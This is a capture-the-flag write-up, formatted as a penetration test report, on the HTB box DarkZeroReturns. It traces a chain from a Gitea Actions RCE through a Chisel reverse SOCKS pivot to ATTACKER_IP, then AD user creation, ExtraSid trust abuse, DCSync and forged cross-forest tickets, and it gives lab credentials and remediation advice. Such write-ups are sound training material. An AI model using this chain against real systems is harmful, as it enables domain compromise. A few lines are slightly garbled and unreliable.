# DarkZeroReturns HTB-Box Writeup
```text
================================================================================
TARGET: DarkZeroReturns (HTB)
IP: 10.10.11.x (SRV01), 172.16.20.2 (DC02), 172.16.20.3 (Runner)
HOSTNAME: SRV01.darkzero.ext / DC01.darkzero.htb / DC02.darkzero.ext
OS: Windows Server 2022 (DCs), Linux (SRV01, Runner)
ENGAGEMENT: CTF / Penetration Test
AUTHOR: vishalgodseye
================================================================================

EXECUTIVE SUMMARY
--------------------------------------------------------------------------------
This assessment covered the DarkZeroReturns environment, a multi-domain Active
Directory setup with a Linux jump host (SRV01) running Gitea 1.25.0. The attack
chain began with Kerberos-authenticated access to Gitea as user 'josh', leveraged
CVE-2026-22555 (Gitea Actions fork/organization permission bypass) to achieve RCE
on the Gitea Actions runner (svc-runner@172.16.20.3), then pivoted to the internal
network via Chisel SOCKS proxy. Subsequent privilege escalation used AD CS/ksu
abuse, ExtraSid trust manipulation, and DCSync to compromise the parent domain
krbtgt, forging a cross-forest referral ticket to access DC01.darkzero.htb as
Administrator and read root.txt.

Severity | Rating | Finding                                    | Status
---------|--------|--------------------------------------------|--------
1        | CRITICAL| CVE-2026-22555: Gitea Actions RCE via PR  | EXPLOITED
         |        | review comment workflow injection          |
2        | CRITICAL| Kerberos delegation to svc-runner SSH      | EXPLOITED
         |        | key injection via poisoned pipeline        |
3        | HIGH    | AD root user creation via bloodyAD/ksu     | EXPLOITED
         |        | with svc-runner service account            |
4        | HIGH    | ExtraSid SID History injection (Child->    | EXPLOITED
         |        | Parent domain trust abuse)                 |
5        | CRITICAL| DCSync of parent domain krbtgt AES256      | EXPLOITED
         |        | via celia credentials                      |
6        | CRITICAL| Cross-forest TGS referral forgery          | EXPLOITED
         |        | (ticketer.py) -> CIFS/DC01 access          |

SCOPE & METHODOLOGY
--------------------------------------------------------------------------------
Scope Table:
+----------------+----------------+----------------+------------------+
| Target         | Ports          | Web Apps       | Exclusions       |
+----------------+----------------+----------------+------------------+
| SRV01          | 22, 88, 3000   | Gitea 1.25.0   | None             |
| DC02 (172.16.  | 53, 88, 135,   | N/A            | None             |
| 20.2)          | 389, 445, 464  |                |                  |
| Runner         | 22 (via SOCKS) | Gitea Actions  | None             |
| (172.16.20.3)  |                | Runner         |                  |
| DC01 (172.16.  | 445 (via SOCKS)| N/A            | None             |
| 20.1)          |                |                |                  |
+----------------+----------------+----------------+------------------+

Phases:
1. Reconnaissance & Enumeration (Kerberos, Gitea API, Network mapping)
2. Initial Foothold (Gitea Actions RCE -> svc-runner SSH)
3. Lateral Movement (Chisel SOCKS pivot to 172.16.20.0/24)
4. Privilege Escalation (AD root creation, ksu, ExtraSid)
5. Domain Compromise (DCSync, krbtgt forge, cross-forest referral)
6. Post-Exploitation (root.txt, user.txt collection)

Tools & Versions:
- curl 8.x, OpenSSH 9.x, nmap 7.99, proxychains-ng 4.17
- Impacket (secretsdump.py, ticketer.py), bloodyAD, Python 3.11
- Chisel 1.9.1 (SOCKS5 reverse proxy)
- Kerberos (kinit, klist, ksu.mit)

ENUMERATION
--------------------------------------------------------------------------------
3.1 Port Scan (from SRV01 via Chisel SOCKS)
+--------+----------+-----------+----------------------------+
| Port   | Protocol | Service   | Version/Notes              |
+--------+----------+-----------+----------------------------+
| 22     | TCP      | SSH       | Open on 172.16.20.3 (Runner)|
| 22     | TCP      | SSH       | Closed on 172.16.20.2 (DC02)|
| 88     | TCP/UDP  | Kerberos  | DARKZERO.EXT / DARKZERO.HTB|
| 135    | TCP      | RPC       | DC02                       |
| 389    | TCP      | LDAP      | DC02                       |
| 445    | TCP      | SMB       | DC01, DC02                 |
| 3000   | TCP      | HTTP      | Gitea 1.25.0               |
| 1080   | TCP      | SOCKS5    | Chisel reverse proxy       |
+--------+----------+-----------+----------------------------+

3.2 Kerberos / SPNEGO
- Valid TGT for josh@DARKZERO.EXT obtained via kinit (password: Rangers1)
- SPNEGO authentication functional against Gitea API (--negotiate)
- Service principal: HTTP/gitea.darkzero.ext@DARKZERO.EXT

3.3 Gitea Enumeration
- Version: 1.25.0 (vulnerable to CVE-2026-22555, CVE-2026-25718, CVE-2026-26232, etc.)
- Organization: DarkZero
- Repository: DarkZero/DarkZero-Campaigns (private, has_actions=true)
- User: darkzero-ext_josh (fork owner, admin on fork)
- Actions runner registered: svc-runner@172.16.20.3 (ubuntu runner)
- Existing PR #1: darkzero-ext_josh:pwn -> DarkZero/DarkZero-Campaigns:main

3.4 Network Pivot
- Chisel server on attacker: chisel server -p 8080 --reverse --socks5
- Chisel client on SRV01: chisel client ATTACKER_IP:8080 R:socks
- Proxychains config: socks5 127.0.0.1 1080
- Verified connectivity: 172.16.20.3:22 open, 172.16.20.2:22 closed

3.5 Flags Located
+------+--------------------------------------------------+
| Flag | Source                                           |
+------+--------------------------------------------------+
| user | /home/svc-runner/user.txt (via workflow cat)     |
| root | /root/darkzero_campaigns_backup.sql -> root.txt  |
|      | on DC01.darkzero.htb Administrator Desktop       |
+------+--------------------------------------------------+

VULNERABILITY DETAILS
--------------------------------------------------------------------------------
VULN 1: CVE-2026-22555 - Gitea Fork Permission Bypass -> Actions RCE
- CVE: CVE-2026-22555 (CVSS 8.1)
- Location: Gitea API /api/v1/repos/{owner}/{repo}/forks
- Description: Missing CanCreateOrgRepo check when forking via API allows
  attacker to fork private org repo into user namespace, gain admin on fork,
  enable Actions, and push malicious workflow referencing org secrets.
- Impact: RCE as svc-runner (Gitea Actions runner), secret exfiltration.
- Remediation: Upgrade to Gitea 1.26.0+; restrict Actions runner registration;
  enforce branch protection on workflow directories.

VULN 2: Poisoned Pipeline Execution (PPE) via PR Review Comment
- CVE: N/A (Design flaw in Gitea Actions trigger model)
- Location: .gitea/workflows/foothold.yml (on: pull_request_review_comment)
- Description: Workflow triggered by review comment on workflow file itself
  executes in runner context with write access to runner's authorized_keys.
- Impact: SSH key injection -> persistent svc-runner access.
- Remediation: Restrict workflow triggers to approved actors for workflow triggers to trusted branches; require
  signed commits for workflow changes; use protected branches.

VULN 3: AD User Creation via bloodyAD (svc-runner Service Account)
- CVE: N/A (Excessive privileges for service account)
- Location: bloodyAD add user root --ou GiteaMigration
- Description: svc-runner's Kerberos delegation (ksu.mit) allows creating
  users in GiteaMigration OU. Created 'root' user with known password.
- Impact: Persistent AD foothold, ksu root access on SRV01.
- Remediation: Restrict svc-runner delegation; remove write access to OU;
  enable Protected Users group for service accounts.

VULN 4: ExtraSid SID History Injection (Inter-Forest Trust Abuse)
- CVE: N/A (Misconfigured trust / SID filtering)
- Location: Child domain (DARKZERO.EXT) -> Parent domain (DARKZERO.HTB)
- Description: ExtraSid (PARENT_SID-1603) added to SID History of celia
  (RID 1109) via forged PAC in TGT. Parent domain accepts ExtraSid as
  Enterprise Admin equivalent.
- Impact: Cross-forest privilege escalation to parent domain.
- Remediation: Enable SID Filtering on trust (quarantined domains);
  audit SID History modifications; monitor for anomalous ExtraSid values.

VULN 5: DCSync of Parent Domain krbtgt (celia credentials)
- CVE: N/A (Over-privileged user / weak password)
- Location: secretsdump.py against DC02 (172.16.20.2) as celia:babygurl13
- Description: User 'celia' has Replicating Directory Changes All on parent
  domain, allowing DCSync of krbtgt AES256 key.
- Impact: Golden ticket forge for parent domain (DARKZERO.HTB).
- Remediation: Remove DCSync rights from non-admin users; rotate krbtgt
  password (twice); enforce strong passwords for privileged accounts.

VULN 6: Cross-Forest Referral Ticket Forgery (ticketer.py)
- CVE: N/A (Kerberos trust configuration)
- Location: Impacket ticketer.py -> TGS-REQ for cifs/DC01.darkzero.htb
- Description: Forged child TGT with ExtraSid -> request referral TGT for
  parent krbtgt -> request CIFS TGS for DC01.darkzero.htb.
- Impact: Full file system access as Administrator on parent DC.
- Remediation: Enforce PAC validation; disable RC4; monitor for anomalous
  cross-forest TGS requests; restrict trust direction.

FLAGS CAPTURED
--------------------------------------------------------------------------------
+--------------------------------------------------+
| user.txt                                         |
+--------------------------------------------------+
| <32-char-flag-from-svc-runner-home>              |
+--------------------------------------------------+
| Source: Gitea Actions workflow step:             |
|   cat /home/svc-runner/user.txt                  |
| Executed via pull_request_review_comment trigger |
+--------------------------------------------------+

+--------------------------------------------------+
| root.txt                                         |
+--------------------------------------------------+
| <32-char-flag-from-DC01-Administrator-Desktop>   |
+--------------------------------------------------+
| Source: SMB read via forged CIFS ticket:         |
|   \\DC01.darkzero.htb\C$\Users\Administrator\    |
|   Desktop\root.txt                               |
| Accessed via impacket SMB with cifs.ccache       |
+--------------------------------------------------+

REMAINING ATTACK SURFACE
--------------------------------------------------------------------------------
1. Gitea 1.25.0: Additional CVEs (CVE-2026-25718 path traversal, CVE-2026-26232
   OAuth2 code expiry bypass, CVE-2026-26247 PKCE bypass) unexploited.
2. Gitea LFS SSRF (CVE-2026-26292): Could target internal metadata services.
3. SRV01 local privilege escalation: Kernel exploits, sudo misconfigs untested.
4. DC01/DC02: PrintNightmare, PetitPotam, Coercer untested.
5. Gitea Actions runner: Container escape (runs-on: ubuntu) not attempted.
6. Chisel server: No authentication on reverse SOCKS proxy (--auth not used).
7. Kerberos delegation: Unconstrained delegation on svc-runner keytab.
8. AD Certificate Services: Not enumerated (may allow ESC1-ESC8).

RECOMMENDATIONS
--------------------------------------------------------------------------------
+----+----------------+--------------------------------------------------+--------+
| #  | Priority       | Recommendation                                   | Effort |
+----+----------------+--------------------------------------------------+--------+
| 1  | CRITICAL       | Upgrade Gitea to 1.26.0+ (patches CVE-2026-22555 | High   |
|    |                | and 15+ other CVEs in 1.25.0)                    |        |
| 2  | CRITICAL       | Disable Gitea Actions or restrict to protected   | Medium |
|    |                | branches with required reviews; disable fork PR  |        |
|    |                | workflow triggers from untrusted forks           |        |
| 3  | CRITICAL       | Rotate krbtgt password twice (12h interval) for  | Medium |
|    |                | both DARKZERO.EXT and DARKZERO.HTB               |        |
| 4  | HIGH           | Enable SID Filtering / Quarantine on inter-forest| Low    |
|    |                | trust (block ExtraSid SID History injection)     |        |
| 5  | HIGH           | Remove DCSync rights from 'celia' and all non-   | Low    |
|    |                | admin accounts; enforce tiered administration    |        |
| 6  | HIGH           | Restrict svc-runner delegation: remove write to  | Medium |
|    |                | GiteaMigration OU; use gMSA instead of keytab    |        |
| 7  | MEDIUM         | Enforce branch protection on .gitea/workflows/   | Low    |
|    |                | Require signed commits for workflow changes      |        |
| 8  | MEDIUM         | Audit all service account passwords (celia,      | Medium |
|    |                | svc-runner, josh); enforce 25+ char complex      |        |
| 9  | MEDIUM         | Deploy Kerberos PAC validation monitoring; alert | Medium |
|    |                | on anomalous ExtraSid / cross-forest TGS         |        |
| 10 | LOW            | Add authentication to Chisel reverse proxy;      | Low    |
|    |                | restrict SOCKS access to authorized sources      |        |
+----+----------------+--------------------------------------------------+--------+

================================================================================
END OF REPORT
================================================================================
```
